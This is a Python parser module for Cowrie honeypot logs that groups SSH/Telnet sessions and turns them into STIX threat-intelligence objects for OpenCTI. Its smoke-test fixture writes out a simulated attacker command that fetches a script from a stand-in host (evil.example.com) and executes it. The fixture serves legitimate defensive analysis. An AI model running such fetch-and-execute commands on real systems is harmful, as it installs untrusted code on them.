"""Cowrie parser — SSH and Telnet honeypot sessions.

Cowrie is the richest T-Pot honeypot — high-interaction shell on
ports 22, 23, 2222.  It emits multiple event types per session
(connect, login attempt, command input, file download, disconnect)
all sharing a `session` field.  We correlate by that field and
build per-session STIX that captures the full attacker interaction.

Per V1_SPEC.md §5.1:

  T-Pot doc fields used:
    session, src_ip, src_port, dst_ip, dst_port, eventid,
    username, password, input, shasum/sha256, url, version,
    hassh, kex_algs, duration

  Substance filter: Cowrie sessions with no commands, no downloads,
  and no successful login are emitted as a Sighting only.  Pure
  probe-and-leave noise gets one-line representation rather than
  full SDO graph.
"""

from __future__ import annotations

import logging
import re
from datetime import datetime, timezone
from typing import Iterable, Optional
from urllib.parse import urlparse

from tpot2cti.parsers import register
from tpot2cti.parsers.base import AttackSession, BaseParser, ParsedEvent
from tpot2cti.session import correlate_by_session_id
from tpot2cti.stix.builder import STIXBuilder
from tpot2cti.stix_ids import (
    generate_attack_pattern_id,
    generate_cryptographic_key_id,
    generate_domain_id,
    generate_file_id,
    generate_file_indicator_id,
    generate_ip_indicator_id,
    generate_ipv4_id,
    generate_process_id,
    generate_sensor_id,
    generate_url_id,
)

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Cowrie eventid → semantic category we care about
_LOGIN_SUCCESS_EVENTID = "cowrie.login.success"
_LOGIN_FAIL_EVENTID = "cowrie.login.failed"
_COMMAND_EVENTID = "cowrie.command.input"
_DOWNLOAD_EVENTID = "cowrie.session.file_download"
_UPLOAD_EVENTID = "cowrie.session.file_upload"
_CONNECT_EVENTID = "cowrie.session.connect"
_CLIENT_VERSION_EVENTID = "cowrie.client.version"

# Regex for URL extraction from command text (wget/curl/etc.)
_URL_RE = re.compile(r'\bhttps?://[^\s\'"<>|]+', re.IGNORECASE)


# ---------------------------------------------------------------------------
# Parser
# ---------------------------------------------------------------------------

class CowrieParser(BaseParser):
    """Parser for T-Pot's Cowrie honeypot."""

    type_name = "Cowrie"

    # ──────────────────────────────────────────────────────────────────
    # parse() — one ES doc → one ParsedEvent
    # ──────────────────────────────────────────────────────────────────

    def parse(self, doc: dict) -> Optional[ParsedEvent]:
        src_ip = doc.get("src_ip")
        if not src_ip:
            return None

        ts = self._parse_timestamp(doc)
        if ts is None:
            return None

        event = ParsedEvent(
            src_ip=str(src_ip),
            timestamp=ts,
            sensor_hostname=str(doc.get("t-pot_hostname") or doc.get("host", {}).get("name") or "unknown"),
            event_type="Cowrie",
            session_id=doc.get("session"),
            src_port=self._safe_int(doc.get("src_port")),
            dst_port=self._safe_int(doc.get("dst_port")),
            dst_ip=doc.get("dst_ip"),
            protocol="ssh" if (doc.get("dst_port") in (22, 2222)) else "telnet",
            raw_doc=doc,
        )
        self._populate_geoip(doc, event)

        # Stuff the Cowrie-specific fields into meta — the correlator
        # aggregates them into the AttackSession.
        eventid = doc.get("eventid") or ""
        event.meta["eventid"] = eventid

        if eventid == _LOGIN_SUCCESS_EVENTID:
            event.meta["login_success"] = True
            event.meta["username"] = doc.get("username")
            event.meta["password"] = doc.get("password")
        elif eventid == _LOGIN_FAIL_EVENTID:
            event.meta["login_success"] = False
            event.meta["username"] = doc.get("username")
            event.meta["password"] = doc.get("password")
        elif eventid == _COMMAND_EVENTID:
            event.meta["command"] = doc.get("input")
        elif eventid in (_DOWNLOAD_EVENTID, _UPLOAD_EVENTID):
            sha256 = doc.get("shasum") or doc.get("sha256")
            if sha256:
                event.meta["file_sha256"] = str(sha256).lower()
            if url := doc.get("url"):
                event.meta["file_url"] = str(url)
        elif eventid == _CLIENT_VERSION_EVENTID:
            if version := doc.get("version"):
                event.meta["ssh_version"] = str(version)

        # HASSH may appear on connect events
        if hassh := doc.get("hassh"):
            event.meta["hassh"] = str(hassh)

        return event

    # ──────────────────────────────────────────────────────────────────
    # correlate() — group by session, aggregate substance signals
    # ──────────────────────────────────────────────────────────────────

    def correlate(self, events: Iterable[ParsedEvent]) -> list[AttackSession]:
        return correlate_by_session_id(events, aggregator=self._aggregate_session)

    def _aggregate_session(self, session: AttackSession, events: list[ParsedEvent]) -> None:
        """Walk per-event meta and populate session substance signals."""
        for e in events:
            meta = e.meta
            eventid = meta.get("eventid", "")

            # auth_success — any success in the session counts
            if meta.get("login_success") is True:
                session.auth_success = True

            # credentials tried — capture both successes and failures
            uname = meta.get("username")
            pwd = meta.get("password")
            if uname is not None and pwd is not None:
                session.credentials_tried.append((str(uname), str(pwd)))

            # commands
            if cmd := meta.get("command"):
                session.commands.append(str(cmd))
                # Extract URLs from commands (wget/curl targets)
                for m in _URL_RE.findall(str(cmd)):
                    if m not in session.urls:
                        session.urls.append(m)

            # malware drops
            if sha := meta.get("file_sha256"):
                if sha not in session.malware_hashes:
                    session.malware_hashes.append(sha)
            if url := meta.get("file_url"):
                if url not in session.urls:
                    session.urls.append(url)

            # fingerprints
            if hassh := meta.get("hassh"):
                session.hassh = hassh
            if ver := meta.get("ssh_version"):
                session.ssh_version = ver

        # Derive domains from URLs
        for url in session.urls:
            try:
                host = urlparse(url).hostname
                if host and host not in session.domains:
                    session.domains.append(host)
            except Exception:
                continue

    # ──────────────────────────────────────────────────────────────────
    # has_substance() — the LESSONS §2 substance filter
    # ──────────────────────────────────────────────────────────────────

    def has_substance(self, session: AttackSession) -> bool:
        """Per V1_SPEC §5.1:

        Cowrie sessions with no commands, no downloads, and no
        successful login are emitted as a Sighting only.

        We also count credentials_tried > 0 (the attacker tried something,
        even if every attempt failed) and event_count > 2 (more than just
        connect + disconnect) as substantive.
        """
        return bool(
            session.auth_success
            or session.commands
            or session.malware_hashes
            or session.credentials_tried
            or session.event_count > 2
        )

    # ──────────────────────────────────────────────────────────────────
    # build() — produces STIX objects for one session
    # ──────────────────────────────────────────────────────────────────

    def build(self, session: AttackSession, builder: STIXBuilder) -> list[dict]:
        """Build the full Cowrie session STIX graph.

        Caller is expected to have already determined has_substance() is
        True.  For drive-by sessions the caller invokes
        `builder.build_driveby_session(session)` instead.

        Returns a list of STIX dicts ready for the publisher.
        """
        out: list[dict] = []
        if not session.events:
            return out

        # Foundation: sensor + attacker context (IPv4 + geo + AS)
        out.extend(builder.build_sensor_context(session.sensor_hostname))
        out.extend(builder.build_attacker_context(session.events[0], session=session))

        ipv4_id = generate_ipv4_id(session.src_ip)
        sensor_id = generate_sensor_id(session.sensor_hostname)

        # IP Indicator + based-on → IPv4
        ip_ind = builder.build_ip_indicator(session.src_ip, session=session)
        if ip_ind:
            out.append(ip_ind)
            if rel := builder.build_relationship(
                ip_ind["id"], "based-on", ipv4_id,
                description=f"IP indicator for {session.src_ip}",
            ):
                out.append(rel)

        # HASSH fingerprint → Cryptographic-Key
        if session.hassh:
            ck = builder.build_cryptographic_key(session.hassh)
            if ck:
                out.append(ck)
                if rel := builder.build_relationship(
                    ck["id"], "related-to", ipv4_id,
                    description=f"HASSH fingerprint observed from {session.src_ip}",
                ):
                    out.append(rel)

        # Process (commands)
        if session.commands:
            proc = builder.build_process(session, session.commands)
            if proc:
                out.append(proc)
                if rel := builder.build_relationship(
                    proc["id"], "related-to", ipv4_id,
                    description=f"Commands run by {session.src_ip} in Cowrie session",
                ):
                    out.append(rel)

        # File downloads → StixFile + Indicator + URL/Domain
        for sha256 in session.malware_hashes:
            f = builder.build_file(sha256, session=session)
            if f:
                out.append(f)
                if rel := builder.build_relationship(
                    f["id"], "related-to", ipv4_id,
                    description=f"File {sha256[:16]}… downloaded by {session.src_ip}",
                ):
                    out.append(rel)
                # File Indicator + based-on
                f_ind = builder.build_file_indicator(sha256, session=session)
                if f_ind:
                    out.append(f_ind)
                    if rel := builder.build_relationship(
                        f_ind["id"], "based-on", f["id"],
                        description=f"Honeypot-captured file {sha256[:16]}…",
                    ):
                        out.append(rel)

        # URLs (download sources + URLs in commands)
        for url in session.urls:
            url_obj = builder.build_url(url, session=session)
            if url_obj:
                out.append(url_obj)
                if rel := builder.build_relationship(
                    url_obj["id"], "related-to", ipv4_id,
                    description=f"URL referenced by {session.src_ip}",
                ):
                    out.append(rel)

        # Domains derived from URLs
        for fqdn in session.domains:
            d = builder.build_domain(fqdn, session=session)
            if d:
                out.append(d)

        # Sighting (on the IP Indicator)
        if ip_ind:
            sighting = builder.build_sighting(
                ip_ind["id"], session.sensor_hostname, session,
                count=session.event_count,
                description=self._render_sighting_description(session),
            )
            if sighting:
                out.append(sighting)

        # Session-transcript Note — ONE per Cowrie SSH session, containing
        # the full command transcript + auth + credentials + HASSH + SSH
        # version + malware hashes + URLs. This is the carve-out from
        # LESSONS_LEARNED §7.1: per-session Notes are an anti-pattern in
        # general, but a Cowrie SSH login session is genuinely-per-session
        # content (commands the attacker actually ran) and is what an
        # analyst expects to find on the indicator's page.
        note_body = self._render_session_note_body(session)
        if note_body:
            note_object_refs: list[str] = [ipv4_id]
            if ip_ind:
                note_object_refs.append(ip_ind["id"])
            note = builder.build_session_note(
                session,
                body_md=note_body,
                abstract=(
                    f"Cowrie SSH session from {session.src_ip} "
                    f"({len(session.commands)} command(s)"
                    + (", auth success" if session.auth_success else "")
                    + ")"
                ),
                object_refs=note_object_refs,
            )
            if note:
                out.append(note)
                if ip_ind:
                    if rel := builder.build_relationship(
                        note["id"], "related-to", ip_ind["id"],
                        description=f"Cowrie session transcript for {session.src_ip}",
                    ):
                        out.append(rel)

        return out

    # ──────────────────────────────────────────────────────────────────
    # Helpers
    # ──────────────────────────────────────────────────────────────────

    @staticmethod
    def _safe_int(value) -> Optional[int]:
        if value is None:
            return None
        try:
            return int(value)
        except (TypeError, ValueError):
            return None

    # ──────────────────────────────────────────────────────────────────
    # Note + Sighting renderers
    # ──────────────────────────────────────────────────────────────────

    #: Caps so the Note body stays well below MAX_NOTE_BODY_BYTES (32 KB).
    #: Cowrie sessions with thousands of commands (rare but seen) shouldn't
    #: blow the bundle; truncate gracefully.
    _MAX_COMMANDS_RENDERED = 200
    _MAX_COMMAND_BYTES = 8000

    @staticmethod
    def _render_sighting_description(session: AttackSession) -> str:
        """One-line summary baked into the Sighting.description.

        Complements the per-session Note (which carries the full
        transcript) — this short form is what shows in the indicator's
        Sightings table without clicking through.
        """
        bits: list[str] = [f"Cowrie SSH"]
        if session.auth_success:
            bits.append("auth: success")
        elif session.credentials_tried:
            bits.append(f"auth: failed ({len(session.credentials_tried)} tries)")
        if session.commands:
            bits.append(f"{len(session.commands)} cmd(s)")
        if session.malware_hashes:
            bits.append(f"{len(session.malware_hashes)} file(s) dropped")
        if session.urls:
            bits.append(f"{len(session.urls)} URL(s) referenced")
        return " — ".join(bits)

    @classmethod
    def _render_session_note_body(cls, session: AttackSession) -> str:
        """Render the markdown Note body for one Cowrie SSH session.

        Sections (omitted if empty):
          - Header with session id (short), source IP, sensor, timestamps
          - Auth result + credentials tried
          - SSH client fingerprint (HASSH + version)
          - Command transcript (code-fenced, capped at _MAX_COMMANDS_RENDERED)
          - Files downloaded (sha256)
          - URLs / domains referenced

        Returns empty string when the session has no rendering-worthy
        content — caller skips Note emission in that case.
        """
        # Skip rendering entirely if there's nothing interesting.
        # (substance filter already gates this, but a defensive check
        # avoids empty Notes if a parser change weakens the filter.)
        if not (
            session.auth_success
            or session.credentials_tried
            or session.commands
            or session.malware_hashes
            or session.urls
        ):
            return ""

        sid_short = session.session_id[:16] if session.session_id else "?"
        lines: list[str] = [
            f"# Cowrie SSH session `{sid_short}`",
            "",
            f"- **src_ip:** `{session.src_ip}`",
            f"- **sensor:** `{session.sensor_hostname}`",
            f"- **first_seen:** `{session.first_seen.isoformat()}`",
            f"- **last_seen:**  `{session.last_seen.isoformat()}`",
            f"- **events:** {session.event_count}",
        ]
        if session.dst_ports:
            lines.append(f"- **dst_port(s):** {sorted(session.dst_ports)}")

        # Auth
        lines.append("")
        lines.append("## Authentication")
        lines.append("")
        if session.auth_success:
            lines.append("- **Result:** :white_check_mark: success")
        else:
            lines.append("- **Result:** failed (no successful login)")
        if session.credentials_tried:
            shown = session.credentials_tried[:25]
            lines.append(f"- **Credentials tried** ({len(session.credentials_tried)} total"
                         + (f", first {len(shown)} shown" if len(session.credentials_tried) > 25 else "")
                         + "):")
            for u, p in shown:
                lines.append(f"  - `{u}` / `{p}`")

        # SSH fingerprint
        if session.hassh or session.ssh_version:
            lines.append("")
            lines.append("## SSH client fingerprint")
            lines.append("")
            if session.hassh:
                lines.append(f"- **HASSH:** `{session.hassh}`")
            if session.ssh_version:
                lines.append(f"- **Version string:** `{session.ssh_version}`")

        # Commands
        if session.commands:
            lines.append("")
            lines.append(f"## Commands ({len(session.commands)} executed)")
            lines.append("")
            cmds = session.commands[:cls._MAX_COMMANDS_RENDERED]
            truncated_count = len(session.commands) - len(cmds)
            block_lines: list[str] = []
            total_bytes = 0
            for cmd in cmds:
                line = cmd if isinstance(cmd, str) else repr(cmd)
                total_bytes += len(line.encode("utf-8")) + 1
                if total_bytes > cls._MAX_COMMAND_BYTES:
                    block_lines.append("... [transcript truncated for size]")
                    break
                block_lines.append(line)
            lines.append("```")
            lines.extend(block_lines)
            lines.append("```")
            if truncated_count > 0:
                lines.append(f"_({truncated_count} additional command(s) omitted)_")

        # Files downloaded
        if session.malware_hashes:
            lines.append("")
            lines.append(f"## Files downloaded ({len(session.malware_hashes)})")
            lines.append("")
            for h in session.malware_hashes:
                lines.append(f"- `{h}`")

        # URLs / domains
        if session.urls:
            lines.append("")
            lines.append(f"## URLs referenced ({len(session.urls)})")
            lines.append("")
            for u in session.urls:
                lines.append(f"- {u}")
        if session.domains:
            lines.append("")
            lines.append(f"## Domains derived ({len(session.domains)})")
            lines.append("")
            for d in session.domains:
                lines.append(f"- {d}")

        return "\n".join(lines)


# Register on import
register(CowrieParser())


# ---------------------------------------------------------------------------
# Smoke test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import json
    from datetime import timedelta

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = CowrieParser()

    # Build a small synthetic session: connect, login fail, login success,
    # 2 commands, 1 download.
    now = datetime.now(timezone.utc)
    base_doc = {
        "@timestamp": now.isoformat(),
        "src_ip": "1.2.3.4",
        "src_port": 50001,
        "dst_port": 22,
        "session": "deadbeef0001",
        "t-pot_hostname": "node1",
        "type": "Cowrie",
        "geoip": {"country_iso_code": "CN", "country_name": "China",
                   "city_name": "Beijing", "asn": 4134, "organization": "ChinaNet"},
    }

    events_raw = [
        {**base_doc, "eventid": _CONNECT_EVENTID,
         "@timestamp": (now + timedelta(seconds=0)).isoformat(),
         "hassh": "0a1b2c3d4e5f6789abc"},
        {**base_doc, "eventid": _LOGIN_FAIL_EVENTID,
         "@timestamp": (now + timedelta(seconds=2)).isoformat(),
         "username": "root", "password": "wrongpass"},
        {**base_doc, "eventid": _LOGIN_SUCCESS_EVENTID,
         "@timestamp": (now + timedelta(seconds=5)).isoformat(),
         "username": "root", "password": "root"},
        {**base_doc, "eventid": _COMMAND_EVENTID,
         "@timestamp": (now + timedelta(seconds=8)).isoformat(),
         "input": "wget http://evil.example.com/payload.sh -O /tmp/x.sh"},
        {**base_doc, "eventid": _COMMAND_EVENTID,
         "@timestamp": (now + timedelta(seconds=10)).isoformat(),
         "input": "chmod +x /tmp/x.sh && /tmp/x.sh"},
        {**base_doc, "eventid": _DOWNLOAD_EVENTID,
         "@timestamp": (now + timedelta(seconds=12)).isoformat(),
         "shasum": "abcdef0123456789" * 4, "url": "http://evil.example.com/payload.sh"},
    ]

    # parse
    events = []
    for d in events_raw:
        e = parser.parse(d)
        if e:
            events.append(e)
    print(f"parsed {len(events)} events")

    # correlate
    sessions = parser.correlate(events)
    print(f"correlated into {len(sessions)} session(s)")
    s = sessions[0]
    print(f"  session_id:        {s.session_id}")
    print(f"  src_ip:            {s.src_ip}")
    print(f"  auth_success:      {s.auth_success}")
    print(f"  commands:          {s.commands}")
    print(f"  malware_hashes:    {s.malware_hashes}")
    print(f"  urls:              {s.urls}")
    print(f"  domains:           {s.domains}")
    print(f"  credentials_tried: {s.credentials_tried}")
    print(f"  hassh:             {s.hassh}")
    print(f"  event_count:       {s.event_count}")

    # substance
    print(f"  has_substance:     {parser.has_substance(s)}")

    # Build STIX (need a Config — use minimal env)
    import os
    os.environ.setdefault("TPOT_HOST", "test")
    os.environ.setdefault("OPENCTI_ADMIN_TOKEN", "00000000-0000-0000-0000-000000000000")
    os.environ.setdefault("TPOT2CTI_CONNECTOR_ID", "00000000-0000-0000-0000-000000000001")
    from tpot2cti.config import load_config

    cfg = load_config()
    builder = STIXBuilder(cfg)
    objects = parser.build(s, builder)
    print(f"\nbuilt {len(objects)} STIX objects:")
    by_type = {}
    for o in objects:
        by_type[o["type"]] = by_type.get(o["type"], 0) + 1
    for t, n in sorted(by_type.items(), key=lambda x: -x[1]):
        print(f"  {t:25s} {n}")

    # Drive-by comparison
    driveby_objects = builder.build_driveby_session(s)
    print(f"\n(comparison) drive-by: {len(driveby_objects)} STIX objects")

    print("\nSmoke test passed.")
